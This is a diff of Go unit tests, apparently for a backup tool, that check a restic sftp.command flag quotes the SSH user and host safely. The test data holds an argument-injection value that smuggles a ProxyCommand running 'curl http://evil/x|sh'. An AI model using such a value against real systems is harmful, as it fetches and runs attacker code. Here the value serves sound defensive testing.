@@ -29,8 +29,8 @@ func TestSFTPCommandFlag_QuotesUserAndHost(t *testing.T) {
 	// value were unquoted, "-o" and "ProxyCommand=..." would each be their own
 	// argv entry once restic tokenizes on spaces.
 	body := strings.TrimPrefix(flag, "sftp.command=")
-	if !strings.Contains(body, "'u -o ProxyCommand=curl http://evil/x|sh@example.com'") {
-		t.Errorf("user@host was not quoted as a single token:\n%s", body)
+	if !strings.Contains(body, "-l 'u -o ProxyCommand=curl http://evil/x|sh' -s -- example.com sftp") {
+		t.Errorf("user was not quoted as a single token:\n%s", body)
 	}
 }
 
@@ -43,11 +43,8 @@ func TestSFTPCommandFlag_LeavesOrdinaryValuesUnquoted(t *testing.T) {
 		Auth: "password",
 		Path: "/backups",
 	})
-	if !strings.Contains(flag, "bkp-user@backup.example.com") {
-		t.Errorf("ordinary user@host should pass through unquoted:\n%s", flag)
-	}
-	if strings.Contains(flag, "'bkp-user@backup.example.com'") {
-		t.Errorf("ordinary user@host was needlessly quoted:\n%s", flag)
+	if !strings.HasSuffix(flag, " -l bkp-user -s -- backup.example.com sftp") {
+		t.Errorf("ordinary user and host should pass through unquoted:\n%s", flag)
 	}
 }
 
